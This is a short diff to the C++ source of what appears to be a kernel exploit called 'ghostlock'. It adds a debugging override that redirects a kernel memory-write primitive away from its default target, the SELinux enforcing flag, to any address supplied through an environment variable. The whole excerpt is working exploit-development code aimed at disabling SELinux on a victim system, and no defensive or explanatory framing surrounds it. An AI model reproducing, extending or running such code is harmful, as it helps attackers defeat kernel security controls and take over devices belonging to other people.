@@ -28,6 +28,8 @@
 
 #include <unistd.h>
 
+#include <cstdlib>
+
 #include <array>
 #include <cstdint>
 #include <optional>
@@ -395,10 +397,23 @@ namespace ghostlock::session::backend {
                     w1_attempts = 1;
                 }
                 support::run_state::enter("w1a");
+                /* E7 diagnostic: GHOSTLOCK_W1_TARGET=<abs-addr> overrides the
+                 * write target so the erase primitive can be probed against a
+                 * userspace-visible location (e.g. the sysctl_bootid data the
+                 * p0 line prints) instead of blind SELinux state. */
+                uintptr_t w1_target =
+                    session.addresses.data_alias(ghostlock::profile::selinux_enforcing());
+                if (const char *target_env = std::getenv("GHOSTLOCK_W1_TARGET");
+                    target_env != nullptr && target_env[0] != '\0') {
+                    w1_target = static_cast<uintptr_t>(
+                        std::strtoull(target_env, nullptr, 0));
+                    pr_info("W1: target overridden by env -> 0x%llx\n",
+                            static_cast<unsigned long long>(w1_target));
+                }
                 selinux_ok = retry_write_stage<M>(
                     session,
                     "W1: SELinux",
-                    session.addresses.data_alias(ghostlock::profile::selinux_enforcing()),
+                    w1_target,
                     1, w1_attempts,
                     g_exploit_session.profile.w1_settle_us(),
                     victim::verify_selinux_stage, nullptr, 0);
